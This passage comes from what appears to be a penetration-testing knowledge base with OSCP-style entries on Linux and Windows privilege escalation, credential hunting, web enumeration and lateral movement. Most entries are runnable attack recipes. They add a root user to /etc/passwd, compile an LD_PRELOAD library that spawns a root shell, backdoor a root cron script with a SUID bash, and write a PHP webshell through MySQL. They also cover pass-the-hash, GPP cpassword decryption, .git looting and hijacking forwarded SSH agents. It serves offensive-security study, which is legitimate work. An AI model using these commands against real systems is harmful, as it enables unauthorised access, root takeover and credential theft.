    *                  no password set / login via password disabled
    !*                 locked AND no usable password
    (empty)            NO password required — anyone can log in: a serious misconfig

## How it's misused
- **Readable shadow** (root, a backup, SeBackup-like capability, or a careless `chmod`) + a real
  hash -> crack offline: `unshadow passwd shadow > c; john c` or `hashcat`.
- **Writable shadow** (as non-root, via a misconfig) -> replace a user's hash with one you make
  (`openssl passwd -6 'pw'`) and log in as them.
- Empty field-2 or a `max`/`expire` that never forces change = weak-policy leads.

## Pattern
Field 2 is the prize: a `$...$` hash to crack, or a lock marker telling you the account can't
password-auth. Read vs write access to this file decides crack-it vs just-set-it.

entries.title: Generating password hashes (openssl passwd & friends)
entries.brief: How to make a crypt hash, the format IDs, and the offensive uses
entries.body:
## Why generate a hash
To *set* a password where only a hash is accepted — dropping a known password into /etc/shadow
or /etc/passwd (privesc), or seeding a test account. These produce the same `$id$salt$hash`
crypt strings the shadow file stores.

## openssl passwd
    openssl passwd -6 'Password123'      # sha512crypt  ($6$...)
    openssl passwd -1 'Password123'      # md5crypt     ($1$...)
    openssl passwd -5 'Password123'      # sha256crypt  ($5$...)
    openssl passwd -apr1 'Password123'   # Apache htpasswd MD5 (for .htpasswd files)
`-salt X` fixes the salt (reproducible). openssl doesn't do yescrypt/bcrypt — use mkpasswd:
    mkpasswd -m sha-512 'Password123'    # (from the whois package) more algorithms
    mkpasswd -m bcrypt 'Password123'

## The format IDs (same as /etc/shadow field 2)
    $1$ md5crypt   $5$ sha256crypt   $6$ sha512crypt   $2b$ bcrypt   $y$ yescrypt

## How it's misused (classic privesc)
- **Writable /etc/passwd**: put a hash straight in field 2 (it *overrides* shadow), or add a new
  UID-0 user:
      openssl passwd -1 -salt x pass          # -> $1$x$...
      echo 'hx:$1$x$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su hx   # root
- **Writable /etc/shadow**: replace root's field-2 hash with yours, then `su root`.
- Seed an `.htpasswd` entry to access a protected web dir you can write to.

## The reverse direction
Cracking goes the other way (hash -> password): see password-cracking-workflow and
hashes-and-formats. openssl/mkpasswd *create*; john/hashcat *break*.

## Pattern
"I need to SET a password" -> generate the matching `$id$` crypt hash and write it where a hash
is read (passwd/shadow/.htpasswd). Writable auth files + a generated hash = instant account.

entries.title: A tour of /etc — the config files that matter
entries.brief: Where the system keeps its settings, and what each leaks to an attacker
entries.body:
## /etc = system-wide configuration, in plain text
Learn the high-value files; after any foothold you read these first.

| File | What it is | Offensive read |
| --- | --- | --- |
| /etc/passwd | accounts (7 fields) | users, UID 0s, shells; writable = add root user |
| /etc/shadow | password hashes (root-only) | crack or (if writable) set hashes |
| /etc/group | groups and members | docker/lxd/sudo/adm membership = privesc |
| /etc/sudoers(.d) | sudo policy | what you can run as root |
| /etc/ssh/sshd_config | SSH server settings | PermitRootLogin, key/password auth, AllowUsers |
| /etc/crontab, /etc/cron.d | scheduled jobs | root jobs you might influence |
| /etc/hosts | static name->IP | internal names; writable = redirect |
| /etc/fstab | mounts at boot | credentials sometimes stored here; mount options |
| /etc/exports | NFS shares | no_root_squash = privesc |
| /etc/resolv.conf | DNS servers | the resolver in use |
| /etc/apt/sources.list | package repos | distro/version clues |
| /etc/os-release, /etc/issue | OS version/banner | kernel-exploit matching |
| /etc/login.defs | password/UID policy | UID ranges, password aging defaults |
| /etc/pam.d/* | authentication stack | how logins are checked (PAM) |
| /etc/environment, /etc/profile, /etc/*.d | global shell env | PATH, exported secrets |

## Fast sweep
    ls -la /etc | grep -v 'root root'              # non-root-owned config = suspicious
    grep -rniE 'password|secret|token' /etc 2>/dev/null
    find /etc -writable -type f 2>/dev/null         # writable config = direct privesc

## How it's misused
Writable config under /etc is often an instant win: /etc/passwd (add root user), sudoers.d
(add a rule), a cron script, an ssh key path, or a service unit. Readable secrets (DB creds in
an app config, a token in /etc/environment) feed credential reuse.

## Pattern
"What does the system trust this file to decide, and can I read or write it?" Read for secrets
and version clues; a *writable* /etc file usually maps directly to a privesc technique.

entries.title: Linux auth security features (PAM, login.defs, umask)
entries.brief: The mechanisms that gate logins and defaults — and what weakens them
entries.body:
## The pieces that decide 'can this login happen, and as what?'
- **PAM (/etc/pam.d/)** — Pluggable Authentication Modules: a stack of checks each service runs
  for auth, account, password and session. It enforces password quality (pam_pwquality),
  lockout (pam_faillock/pam_tally2), and things like pam_wheel (only wheel may `su`).
- **/etc/login.defs** — defaults for the shadow suite: UID/GID ranges (UID_MIN 1000),
  PASS_MAX_DAYS/MIN/WARN (aging), ENCRYPT_METHOD (YESCRYPT/SHA512), UMASK.
- **umask** — the bits removed from default permissions on new files (022 -> 644/755). A loose
  umask (000) makes world-writable files.
- **/etc/securetty, /etc/shells** — where root may log in from; valid login shells.
- **sudo & su** — privilege elevation (see su-vs-sudo, sudoers-file).
- **Account lockout & aging** — faillock counts bad tries; chage/last fields enforce expiry.

## Inspect them
    chage -l bob                 # password aging/expiry for a user
    grep -E 'PASS_|UMASK|UID_MIN' /etc/login.defs
    faillock --user bob          # failed-login/lockout state
    cat /etc/pam.d/common-auth   # the auth stack

## How it's weakened / misused
- No lockout (no faillock) -> online brute force (hydra) is viable.
- Weak/absent pam_pwquality -> short passwords survive -> easier cracking.
- A writable PAM config or a malicious PAM module -> auth backdoor / credential capture.
- Loose umask or ENCRYPT_METHOD=MD5 -> world-writable files / weak hashes.

## Pattern
Auth is a *stack of policies* (PAM) over *stored facts* (shadow/login.defs). Attackers probe for
the missing control — no lockout, weak hashing, a writable policy file — and exploit that one
gap. Defenders harden each layer.

entries.title: Reading linPEAS/winPEAS output (don't just scroll)
entries.brief: How to interpret the enumeration dump instead of drowning in it
entries.body:
## The trap
linPEAS/winPEAS print a huge, colourful report. Scrolling past it wastes the tool. The value is
in *reading* the few highlighted lines — it already colour-codes risk for you.

## The colour code (linPEAS)
- **Red/Yellow background** = a 95%+ likely privesc vector — look here first.
- **Red text** = interesting/misconfigured.
- Plain = informational.
Run it and save output so you can search it:
    ./linpeas.sh -a | tee linpeas.out        # then: less -R linpeas.out

## What to scan for, in order
1. **sudo** rights and **SUID**/**capabilities** (the fast wins).
2. **Credentials** found in files, history, configs (grep the output for 'pass').
3. **Cron**/timers running as root with writable inputs.
4. **Writable** files/dirs owned by root; PATH issues; service misconfigs.
5. **Kernel/OS version** (only after the above) for an exploit match.

## winPEAS equivalents
Token privileges (SeImpersonate), unquoted service paths, AlwaysInstallElevated, stored creds
(Credential Manager, unattend.xml), writable service binaries — same idea, Windows flavour.

## Pattern
These tools *find* leads; you *choose* the path. Jump to the highlighted (red/yellow) items,
confirm each manually, and map it to a technique (`oscp methods`, `oscp gtfo`). Enumeration
output is a to-do list, not a wall of text.

entries.title: Web enumeration — a checklist per web service
entries.brief: The ordered passes that turn a web port into a foothold
entries.body:
## Why order matters
A web app has many layers; enumerate each before concluding "nothing here." Work the list top to
bottom, re-running with any new context (a vhost, creds, a version).

## The passes
1. **Fingerprint**: `curl -sI`, whatweb, Wappalyzer — server, framework, exact versions ->
   searchsploit the versions.
2. **Content discovery**: feroxbuster/ffuf/gobuster for dirs and files; try extensions
   (.php,.bak,.txt,.zip,.old). Read robots.txt, sitemap.xml, and page **source + comments**.
3. **Virtual hosts**: ffuf a Host header; add hits to /etc/hosts and re-enumerate each vhost.
4. **Default/known paths**: /admin, /phpmyadmin, /.git/, /backup, framework consoles; nikto for
   known issues; wpscan if it's WordPress.
5. **Auth**: default creds, weak creds (hydra on the form), password reset logic, registration.
6. **Input testing** (map parameters first): SQLi, command injection, LFI/RFI, SSTI, XSS, SSRF,
   file upload, IDOR — see the matching `oscp manual` logic entries.
7. **Source** (if you can read it): the OSWE source-review method (web-source-review).

## High-value freebies
Exposed `.git/` -> dump the repo (git-dumper) for source and secrets. Backups (`.bak`, `.zip`)
left in webroot. Verbose errors/stack traces (trigger a 500) leaking paths/versions.

## Pattern
Fingerprint -> discover content -> vhosts -> known paths -> auth -> input bugs -> source. Each
layer can unlock the next; the version you fingerprint and the paths you find drive everything
after. Commands: `oscp show web`, `oscp atlas ffuf/gobuster/nikto/curl`.

entries.title: Exposed .git — free source code and secrets
entries.brief: Why a web-reachable .git folder hands you the whole repository
entries.body:
## The mistake
Someone deployed a site by `git clone`/`git pull` into the webroot and left the **.git/**
directory web-accessible. That directory contains the *entire repository* — all source and the
full commit history, including secrets that were committed and later 'removed'.

## Confirm it
    curl -s http://TARGET/.git/HEAD          # 'ref: refs/heads/master' = it's there
    curl -s http://TARGET/.git/config

## Dump the whole repo
    git-dumper http://TARGET/.git ./loot     # reconstructs the working tree + history
    # or: wget -r http://TARGET/.git/  (if directory listing is on)

## Mine it
    cd loot
    git log --oneline --all                  # every commit, including deleted branches
    git show <commit>                         # what changed
    git log -p | grep -iE 'password|secret|api[_-]?key|token'
    git stash list; git branch -a            # stashes/branches hide things too
Secrets that were 'deleted' in a later commit are still in history — that's the point.

## Pattern
"Is .git reachable over HTTP?" If yes, download it and read the history: source code reveals
logic bugs (OSWE) and credentials/keys that were committed at some point. Also check /.svn/,
/.hg/, and backup dirs for the same mistake.

entries.title: Shared library hijacking (LD_PRELOAD / LD_LIBRARY_PATH)
entries.brief: Making a privileged program load YOUR code instead of a real library
entries.body:
## The idea
Programs load shared libraries (.so) at runtime by name, searching a set of paths. If you can
influence *which* .so a privileged program loads — or force-load one — its privilege runs your
code. It's PATH-hijacking's cousin, for libraries.

## The environment levers
- **LD_PRELOAD** — force-loads your .so *before* all others; your functions override the real
  ones. Only honoured for privileged binaries if the environment is preserved.
- **LD_LIBRARY_PATH** — extra directories searched first for libraries.
These are normally stripped for SUID binaries and by `sudo` (env_reset). They bite when they
are NOT stripped.

## The sudo case (the classic win)
If `sudo -l` shows **env_keep += LD_PRELOAD** (or SETENV on a command):
    # compile a tiny library with a constructor that drops a shell:
    gcc -fPIC -shared -o /tmp/x.so -xc - <<'EOF'
    #include <stdlib.h>
    __attribute__((constructor)) void init(){ setuid(0); system("/bin/bash -p"); }
    EOF
    sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>     # runs init() as root -> root shell

## Other variants
- A SUID binary with an **RPATH** pointing at a writable dir -> drop a malicious .so there.
- A program that `dlopen`s a library by relative name while running as root in a dir you control.
Find missing libs with `ldd /path/bin` or `strace -f prog 2>&1 | grep -i open.*\.so`.

## Pattern
"Can I control which .so a root process loads, or preload my own?" env_keep LD_PRELOAD,
writable RPATH dirs, or a missing library in a writable path all mean: your library, root's
privilege.

entries.title: Writable cron job -> root (worked example)
entries.brief: Turning a root-scheduled script you can edit into a root shell
entries.body:
## The setup you're hunting
A cron job runs **as root** on a timer and executes a script (or a binary) that **you can
write** — directly, or because its directory is writable, or via a wildcard/PATH it resolves.

## Find it
    cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*/
    crontab -l 2>/dev/null
    ./pspy64                 # watch commands (incl. cron) run in real time, no root needed
Note who each job runs as and what it executes; then check that target's permissions:
    ls -la /opt/backup.sh

## Case 1 — the script itself is writable
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
    # wait for the next tick, then:
    /tmp/rootbash -p         # SUID-root bash -> root

## Case 2 — you can't edit the script, but its DIRECTORY is writable
Replace the script with your own (same name), or exploit a relative path / wildcard it uses
(see: wildcards-globbing for the tar/`*` trick).

## Case 3 — the job calls a bare command and sets no PATH
Drop a malicious binary of that name earlier in the PATH the cron uses (see: path-variable).

## Pattern
"A command runs as root on a schedule — can I control what it runs?" Writable script, writable
dir, abusable wildcard, or a hijackable PATH each -> plant a SUID-root bash (or a reverse shell)
and wait for the tick. `pspy` is how you discover the jobs you can't see in crontab.

entries.title: Windows autoruns & the registry
entries.brief: Where Windows auto-starts code, and the registry keys that become privesc
entries.body:
## The registry in one line
A hierarchical key/value database (HKLM = machine-wide, HKCU = current user). Queried with
`reg query`, searched for creds and autostarts. Much of Windows' 'what runs and when' lives here.

## Autostart locations (persistence & privesc)
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run         # runs at logon (machine)
    HKCU\...\Run                                                  # per user
    Scheduled Tasks (schtasks /query /fo LIST /v)
    Services (autostart) -> see windows-service-privesc
Writable Run keys or task actions = your code runs (as that context) at logon/boot.

## Registry keys that are direct privesc
    # AlwaysInstallElevated: any MSI runs as SYSTEM if BOTH are 1
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    # -> msiexec /quiet /i evil.msi   (SYSTEM)

## Creds hiding in the registry
    reg query HKLM /f password /t REG_SZ /s          # search for stored passwords
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
    # Autologon creds:
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Also: VNC/PuTTY sessions, saved RDP creds, unattended install files reference the registry.

## Pattern
"What does Windows auto-run, and can I write where it's defined?" Run keys, tasks and services
you can edit = code execution; AlwaysInstallElevated = SYSTEM via MSI; and the registry is a
credential store worth grepping. winPEAS checks all of these.

entries.title: Testing REST APIs and GraphQL
entries.brief: How API endpoints differ from web pages, and how to map them
entries.body:
## APIs are just HTTP — with conventions
Instead of HTML pages, an API returns data (usually JSON). You test the same bug classes, but
discovery and shape differ.

## REST basics
- Resources + verbs: `GET /api/users`, `POST /api/users`, `GET /api/users/1`,
  `PUT/DELETE /api/users/1`. The **id** in the path is an IDOR magnet.
- Content type matters: send `Content-Type: application/json` with a JSON body; some parsers
  behave differently for XML/form — a bypass angle.
- Auth is usually a token header: `Authorization: Bearer <JWT>` (see cookies-sessions-jwt).
- **Find endpoints**: swagger/openapi.json, /api/docs, JS files (grep for `/api/`), robots,
  and wordlists of API paths.
    curl -s http://TARGET/api/users -H 'Authorization: Bearer <jwt>'

## GraphQL
One endpoint (often /graphql) takes queries describing exactly what you want.
- **Introspection** reveals the whole schema if enabled — the map of every type and field:
    curl -s http://TARGET/graphql -H 'Content-Type: application/json' \
      -d '{"query":"{__schema{types{name fields{name}}}}"}'
  (GUI tools: GraphQL Voyager / the built-in GraphiQL.)
- Then query sensitive fields directly, test each resolver for injection/IDOR, and watch for
  missing per-field authorization.

## Pattern
"What endpoints exist, what auth do they want, and is each object/field access-controlled?"
Enumerate via docs/JS/introspection, then apply the usual logic bugs (IDOR, injection, broken
access control) to each endpoint/field.

entries.title: OSINT — passive recon before you touch the target
entries.brief: Gathering names, emails, subdomains and leaks without sending a packet
entries.body:
## Why passive first
Before (and alongside) active scanning, open sources give you usernames, emails, subdomains,
tech, and leaked credentials — the raw material for spraying and for guessing where to look.
(On OSCP the scope is the lab; OSINT matters more in OSWA/real engagements, but the enumeration
mindset is identical.)

## What to gather, and from where
- **Subdomains/hosts**: crt.sh (certificate transparency), subfinder/amass, DNS brute (ffuf
  vhost). More surface = more to attack.
- **People -> usernames/emails**: the company site, LinkedIn, GitHub. Derive a username scheme
  (j.smith / jsmith / smithj) for spraying.
- **Code & secrets**: GitHub/GitLab search for the org, hardcoded keys, internal hostnames
  (trufflehog/gitleaks on any repo you find).
- **Breached creds**: public breach datasets / HaveIBeenPwned — reuse is rampant.
- **Tech & metadata**: Wappalyzer, Shodan (exposed services/banners), document metadata
  (exiftool on PDFs/images for usernames and software versions).

## Turn it into access
Names -> a username list (build with the derived scheme) -> password spray (kerbrute/nxc).
Leaked or guessed creds -> try everywhere. Subdomains -> more web apps to enumerate.

## Pattern
"What can I learn without touching the target?" Build the username/email list and the host list
from open sources first; they seed spraying and tell you where to point active enumeration.

entries.title: Wordlists, rules and targeted lists
entries.brief: Choosing and building the right list — the biggest lever in cracking
entries.body:
## The right list beats a bigger list
Cracking success is mostly about the wordlist. Know the staples, then build *targeted* lists for
the specific target.

## The staples (on Kali)
    /usr/share/wordlists/rockyou.txt                 # the default human-password list (gunzip it)
    /usr/share/seclists/                              # the toolkit: passwords, usernames, dirs, vhosts
      Passwords/..., Usernames/..., Discovery/Web-Content/..., Discovery/DNS/...

## Rules — multiply a list cheaply
Rules mangle each word (append digits, capitalize, leet) so a small list covers many variants:
    hashcat ... -r /usr/share/hashcat/rules/best64.rule
    john --wordlist=rockyou.txt --rules        # John's default mangling
best64 is a great default; d3ad0ne/OneRuleToRuleThemAll go harder.

## Build target-specific lists
- **cewl** — scrape a website to harvest words likely used as passwords:
      cewl -d 2 -m 5 http://TARGET -w site.txt
- **crunch** — generate by pattern/charset when you know the shape:
      crunch 8 8 -t 'Pass@%%%%'            # 'Pass@' + 4 digits
- **username-anarchy / mentalist** — turn names into username/password candidates.
- Combine found words (company name, year, product) + rules.

## Masks (hashcat -a3) when you know the shape
    ?u uppercase ?l lowercase ?d digit ?s symbol  ->  Season2026! = ?u?l?l?l?l?l?d?d?d?d?s

## Pattern
Match the list to the target: rockyou+rules for generic, cewl for the org's own vocabulary,
crunch/mask when you know the password policy/shape. The list is the lever — tune it before you
reach for a bigger one.

entries.title: Database enumeration (MySQL / MSSQL / PostgreSQL)
entries.brief: What to do once you can talk to a database, and the privesc paths
entries.body:
## When this applies
You found DB creds (config file, SQLi, reuse) or an exposed DB port (3306 MySQL, 5432 Postgres,
1433 MSSQL, 1521 Oracle, 27017 Mongo). Now enumerate it for data — and sometimes for RCE.

## Connect
    mysql -h TARGET -u root -p                         # 3306
    psql 'host=TARGET user=postgres password=... dbname=postgres'   # 5432
    impacket-mssqlclient user:pass@TARGET -windows-auth             # 1433

## Enumerate (same shape everywhere)
    show databases;  use X;  show tables;  select * from users;     # MySQL
    \l   \c db   \dt   select * from users;                        # Postgres
    SELECT name FROM sys.databases; (MSSQL)
Look for: user/password tables (crack or reuse the hashes), config/secrets, and the DB version
(-> known CVEs).

## Database -> OS (privesc / RCE)
- **MSSQL**: `xp_cmdshell` runs OS commands as the service account; `EXECUTE AS` / linked
  servers for lateral movement.
    EXEC xp_cmdshell 'whoami';
- **PostgreSQL**: `COPY ... FROM PROGRAM 'cmd'` (superuser) runs commands; large-object file
  read/write.
- **MySQL**: `INTO OUTFILE` writes files (webshell into webroot if FILE priv + writable path);
  UDF privesc if the DB runs as root.
    SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php';

## Pattern
"What account am I as the DB, and what can the DB touch on the OS?" Dump data and creds first;
then, if you're a privileged DB user, use the engine's command/file primitives to read/write
the filesystem or run OS commands as the DB service account.

entries.title: SSH agent forwarding — convenience that pivots attackers
entries.brief: Why a forwarded agent socket lets whoever controls the box authenticate as you
entries.body:
## What agent forwarding is
`ssh-agent` holds your decrypted private keys so you don't retype the passphrase. With
**forwarding** (`ssh -A`), a remote host you log into can use *your* local agent to authenticate
onward — handy for hopping A -> B -> C without copying keys.

## Why it's an attacker's gift
The forwarded agent exposes a **socket** on the remote box (`$SSH_AUTH_SOCK`). Anyone who can
read that socket (root on that box, or you after privesc) can ask your agent to sign — i.e.
**authenticate as you** to anywhere your keys are trusted, without ever seeing the key.
    env | grep SSH_AUTH_SOCK
    SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.1234 ssh-add -l   # list keys you can now use
    SSH_AUTH_SOCK=... ssh user@next-host               # hop as the victim

## Related: known_hosts & config
- `~/.ssh/config` can reveal other hosts, users and key paths the victim connects to.
- `~/.ssh/known_hosts` lists hosts they've reached (targets to pivot to). On modern systems the
  hostnames are hashed, but older ones are plaintext.

## Pattern
"Is an SSH agent forwarded here (SSH_AUTH_SOCK set), and can I reach its socket?" If so, you
inherit the victim's ability to authenticate onward — a lateral-movement jackpot. Defenders
avoid blanket `-A`/ForwardAgent and use `ProxyJump` instead.

entries.title: polkit & pkexec (PwnKit and friends)
entries.brief: What polkit is, and why pkexec has been a near-universal local root
entries.body:
## What polkit/pkexec are
**polkit** (PolicyKit) decides whether an unprivileged process may do a privileged action.
**pkexec** is its `sudo`-like front end — a **SUID-root** binary that runs a command as another
user per policy. Because it's SUID root and widely installed, its bugs are high-impact.

## PwnKit (CVE-2021-4034) — the famous one
A memory-corruption bug in `pkexec`'s argument handling let *any local user* get root, with no
configuration needed, on virtually every Linux distro for years. If `pkexec` is present and
unpatched, it's often the fastest, most reliable local root.
    pkexec --version          # check the version against the CVE
    # public one-shot exploits exist (PwnKit) — read before running

## CVE-2021-3560 (polkit auth bypass)
A race in polkit let you run privileged D-Bus actions (e.g. create an admin user) by killing the
request at the right moment. Different bug, same component.

## How to spot the path
    ls -l $(which pkexec)                  # SUID root?
    find / -name pkexec 2>/dev/null
    # also appears in linpeas 'interesting SUID' output

## Pattern
"Is pkexec present and unpatched?" polkit/pkexec bugs are config-free local roots — check the
version first, prefer them over kernel exploits (safer, no panic), and always read a public
exploit before running it. Patched systems need a real misconfig instead.

entries.title: Windows credential stores: GPP & LAPS
entries.brief: Two classic places Windows/AD leaks or protects local-admin passwords
entries.body:
## GPP cpassword — a gift that keeps giving
Old **Group Policy Preferences** could set local accounts/passwords, storing an *encrypted*
password (`cpassword`) in XML on SYSVOL — but Microsoft **published the AES key**, so it's
trivially decryptable. Any domain user can read SYSVOL.
    # find and decrypt:
    findstr /S /I cpassword \\DOMAIN\SYSVOL\*.xml       # on Windows
    nxc smb DC -u user -p pass -M gpp_password             # via NetExec
    gpp-decrypt "<cpassword-blob>"                          # on Kali
Files: Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml.

## LAPS — the modern, *correct* approach (and your target)
**LAPS** randomises each machine's local Administrator password and stores it in AD, readable
only by authorised principals. If you compromise an account that's *allowed to read* LAPS, you
get local admin on those machines.
    nxc ldap DC -u user -p pass -M laps                    # read LAPS passwords you can access
    # attribute: ms-Mcs-AdmPwd (legacy) / msLAPS-Password (new)
Finding who can read LAPS is a BloodHound query (ReadLAPSPassword edge).

## Pattern
GPP = a legacy leak: grep SYSVOL for cpassword and decrypt with the public key. LAPS = a control
you *abuse via permissions*: find an account allowed to read `ms-Mcs-AdmPwd` and pull the local
admin password. Both turn a domain foothold into local admin on hosts.

entries.title: Linux privilege escalation — the enum checklist
entries.brief: The ordered local-enum passes that surface almost every Linux privesc
entries.body:
## Run it in order after every Linux foothold
Automated tools (linpeas) do this fast, but know the manual checks so you can verify and work
without them.

## The passes
1. **Context** — `id`, `sudo -l`, `hostname`, `uname -a`, `/etc/os-release`.
2. **sudo rights** — `sudo -l`; each allowed binary -> `oscp gtfo <bin> sudo`.
3. **SUID/SGID** — `find / -perm -4000 -type f 2>/dev/null` (and -2000) -> GTFOBins.
4. **Capabilities** — `getcap -r / 2>/dev/null` (cap_setuid etc.).
5. **Cron/timers** — `/etc/crontab`, `/etc/cron.*`, `systemctl list-timers`, and `pspy`.
6. **Writable things** — files/dirs owned by root you can write; PATH entries you own;
   world-writable scripts run by root.
7. **Groups** — `id`: docker, lxd, disk, adm, shadow -> each is a path (container-escapes, etc.).
8. **Credentials** — history, configs, ~/.ssh, DB creds, backups (creds-hunting).
9. **Services/sockets** — `ss -tlnp` for loopback-only services; internal ports to pivot/exploit.
10. **Kernel/pkexec** — only after the above: `pkexec --version`, then a matched kernel exploit.

## Why the order
Cheapest, most reliable, least destructive first (sudo/SUID/caps/cron), credentials next,
kernel/exploits last (risk of crashing the box).

## Pattern
Context -> sudo -> SUID -> caps -> cron -> writable -> groups -> creds -> services -> kernel.
Each result feeds a technique in `oscp methods`/`oscp gtfo`. If nothing lands, you missed a
check or a credential — go again with what you now know.

entries.title: Logging & footprints (know what you leave)
entries.brief: Where your actions are recorded — awareness for authorised testing
entries.body:
## Why an attacker (and a tester) cares
Knowing where actions are logged tells you where **defenders** will look, what evidence you must
note for your report, and why 'quiet' techniques exist. (On authorised engagements you document,
not destroy, logs — tampering can be out of scope and is often illegal elsewhere.)

## Where Linux records things
- **/var/log/auth.log** (Debian/Kali) or /var/log/secure — logins, sudo, su, ssh.
- **/var/log/syslog**, service logs under /var/log/.
- **Shell history**: ~/.bash_history, ~/.zsh_history (and in memory until written).
- **last / lastlog / who / w** — login records (wtmp/btmp/utmp).
- **auditd** (if present) — detailed syscall auditing.

## Where Windows records things
- **Event Log**: Security (4624 logon, 4625 failed, 4688 process creation, 4672 special privs),
  System, PowerShell Operational (script-block logging), Sysmon (if deployed).
    wevtutil qe Security /c:5 /rd:true /f:text

## Noise that gets you caught (good to recognise)
Mass failed logins (brute force), new service/task creation, lsass access, and spawning shells
from office apps all generate high-signal events an EDR flags.

## Pattern
"What would show in the logs for what I just did, and where?" Use it to (a) collect evidence for
your report, (b) understand detections, and (c) prefer lower-noise techniques where the rules of
engagement require it — never to illegally destroy logs.

entries.title: Packet sniffing with tcpdump — when and why
entries.brief: What capturing traffic buys you, and reading a capture at a basic level
entries.body:
## When sniffing helps
If you're on a host (or a network position) that sees interesting traffic, capturing it can hand
you **credentials in cleartext protocols** (FTP, HTTP, telnet, SNMP, old POP/IMAP), internal
hostnames, and tokens — things no port scan reveals. Needs root/CAP_NET_RAW.

## Capture
    sudo tcpdump -i any                      # everything (noisy)
    sudo tcpdump -i eth0 -nn                  # no name/port resolution (fast, readable)
    sudo tcpdump -i eth0 port 21 -A          # FTP, with ASCII payload (-A)
    sudo tcpdump -i eth0 -w cap.pcap          # save to a file for Wireshark

## Read it
- `-A` shows ASCII payloads (spot `USER`/`PASS`, HTTP Basic auth, cookies).
- `-X` shows hex+ASCII. Filters: `host 10.0.0.5`, `port 80`, `tcp`, `src`/`dst`.
- Open `cap.pcap` in **Wireshark** -> Follow TCP Stream to reconstruct a conversation; its
  "Export Objects" pulls files out of HTTP/SMB.

## Why it matters
- Cleartext creds on the wire = instant reuse.
- Seeing who talks to whom maps the internal network for pivoting.
- A capture left by someone else (a .pcap on disk) is loot — grep/strings it for creds.

## Pattern
"Can I see traffic others don't expect me to?" Capture with `-nn -A`, hunt cleartext creds and
internal hosts, and use Wireshark's Follow-Stream/Export-Objects to reconstruct sessions and
files. Loose .pcap files on a box are credentials waiting to be read.

entries.title: Pass-the-Hash / Ticket / Key — auth without the password
entries.brief: Why a hash or ticket is as good as the password in Windows
entries.body:
## The core idea
Windows authentication (NTLM, Kerberos) proves you hold a *secret derived from* the password —
not the password text. If you steal that derived secret (an NTLM **hash** or a Kerberos
**ticket/key**), you can authenticate **without ever cracking it**.

## The techniques
- **Pass-the-Hash (PtH)** — use the NTLM hash directly over NTLM auth (SMB/WinRM/RDP).
    nxc smb TARGET -u Administrator -H <NThash>
    impacket-psexec -hashes :<NThash> Administrator@TARGET
    evil-winrm -i TARGET -u Administrator -H <NThash>
- **Pass-the-Ticket (PtT)** — inject a stolen Kerberos TGT/TGS and use it.
    export KRB5CCNAME=ticket.ccache ; impacket-psexec -k -no-pass DOMAIN/user@TARGET
- **Overpass-the-Hash (Pass-the-Key)** — turn an NTLM/AES key into a Kerberos TGT.
    impacket-getTGT -hashes :<NThash> DOMAIN/user
- **Golden/Silver tickets** — forge tickets with the krbtgt (golden) or a service (silver) key.

## Where the secrets come from
secretsdump (SAM/NTDS), mimikatz (lsass, tickets), Kerberoast/AS-REP (crackable), responder
(Net-NTLMv2 — NOT PtH-able; crack or relay it instead).

## Pattern
"Do I have a hash or a ticket?" Reuse it directly: PtH for NTLM, PtT/overpass for Kerberos.
Cracking is optional — the derived secret itself is the credential. (See: active-directory-basics,
hashes-and-formats, atlas secretsdump/mimikatz.)

entries.title: chroot, namespaces & sandbox escapes
entries.brief: What isolates a process on Linux, and why weak isolation is escapable
entries.body:
## What provides 'isolation' on Linux
- **chroot** — changes a process's apparent root dir. It is NOT a security boundary: a process
  with root/CAP_SYS_CHROOT can escape a chroot (the classic double-chroot + chdir trick).
- **namespaces** — the real building blocks of containers: mount, PID, network, user, UTS, IPC.
  Each isolates one resource. `unshare`/`nsenter` create/enter them.
- **cgroups** — limit resources (not isolation per se, but part of containers).
Containers = namespaces + cgroups + a root filesystem. "Escaping a container" means breaking out
of those namespaces to the host.

## Why weak isolation breaks
- A **privileged** container (or `CAP_SYS_ADMIN`) can mount host devices/filesystems -> read/write
  the host (see: container-escapes).
- The **docker socket** inside a container = control of the host daemon = host root.
- `CAP_SYS_PTRACE` + shared PID namespace -> inject into a host process.
- A user namespace misconfig can map you to root on the host for some operations.

## Quick checks (am I contained, and how well?)
    cat /proc/1/cgroup; ls -la /.dockerenv       # am I in a container?
    capsh --print                                # which capabilities I hold
    mount; ls -la /var/run/docker.sock           # host mounts / docker socket exposed?

## Pattern
"What actually isolates me, and is it complete?" chroot is not a jail; a privileged/over-
capable container or an exposed docker socket is a doorway to the host. Enumerate your
namespaces, capabilities and mounts, then target the weakest boundary.

entries.title: SNMP enumeration (161/udp)
entries.brief: Why a guessable community string leaks a whole machine's inventory
entries.body:
## What SNMP leaks
SNMP (UDP 161) exposes a device's internals via an OID tree (the MIB) — running processes,
installed software, network interfaces, listening ports, usernames, and sometimes credentials in
device configs. Access is gated by a **community string** that is often the default `public`.

## Find and walk it
    sudo nmap -sU -p161 TARGET                       # is 161/udp open?
    onesixtyone -c /usr/share/seclists/.../snmp.txt TARGET   # brute community strings
    snmpwalk -v2c -c public TARGET                   # dump the whole tree
    snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25   # Windows user accounts

## High-value OIDs
    1.3.6.1.2.1.25.4.2.1.2   running processes (can include passwords on command lines)
    1.3.6.1.2.1.25.6.3.1.2   installed software
    1.3.6.1.2.1.6.13.1.3     listening TCP ports
    1.3.6.1.4.1.77.1.2.25    Windows users
`snmp-check TARGET -c public` formats a lot of this for you.

## Pattern
"Is 161/udp open, and is the community string guessable?" Default/weak strings (public, private,
community) turn SNMP into a free inventory of users, software and processes — plus creds leaked on
process command lines. UDP is easy to miss, so scan it deliberately.

entries.title: SMTP user enumeration (25/465/587)
entries.brief: Using mail-server verbs to confirm which usernames exist
entries.body:
## The idea
